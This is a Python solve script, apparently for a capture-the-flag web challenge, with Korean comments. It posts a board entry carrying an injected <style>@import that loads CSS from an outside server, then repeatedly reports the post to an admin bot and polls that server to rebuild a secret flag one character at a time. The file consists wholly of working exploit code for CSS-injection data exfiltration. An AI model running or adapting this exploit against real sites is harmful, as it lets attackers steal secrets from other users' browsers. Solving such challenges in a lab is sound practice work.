#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""xsleak 드라이버 — 글에 <style>@import 주입 후 반복 신고하여 한 글자씩 flag 복원.

준비:  다른 터미널에서  python xsleak_server.py   (host:8001)
사용:  python xsleak_solve.py
"""
import re, time, urllib.request, urllib.parse, http.cookiejar

HOST = "http://localhost:9106"; INTERNAL = "http://xsleak:9106"
SRV = "http://localhost:8001"; PORT = 8001
USER = "leaker"

def op_new():
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
def post(op, url, data):
    return op.open(url, urllib.parse.urlencode(data).encode(), timeout=10).read().decode("utf-8", "replace")
def get(op, url):
    return op.open(url, timeout=10).read().decode("utf-8", "replace")

def main():
    style = '<style>@import url("//host.docker.internal:%d/leak.css");</style>' % PORT
    op = op_new()
    post(op, HOST + "/register", {"userid": USER, "userpw": "pw12345"})
    post(op, HOST + "/login", {"userid": USER, "userpw": "pw12345"})
    post(op, HOST + "/write", {"subject": "x", "content": style})
    seq = max(int(x) for x in re.findall(r"/board/(\d+)", get(op, HOST + "/board")))
    print("[+] @import 글 작성 seq=%d. CSS 서버 초기화 후 반복 신고..." % seq)
    urllib.request.urlopen(SRV + "/reset", timeout=5).read()
    prev = ""
    for i in range(40):
        post(op, HOST + "/report", {"url": "%s/board/%d" % (INTERNAL, seq)})
        time.sleep(4)
        known = urllib.request.urlopen(SRV + "/known", timeout=5).read().decode()
        if known != prev:
            print("  round %2d: %s" % (i, known)); prev = known
        if known.endswith("}"):
            print("[+] FLAG:", known); return
    print("[!] 미완료:", prev)

if __name__ == "__main__":
    main()
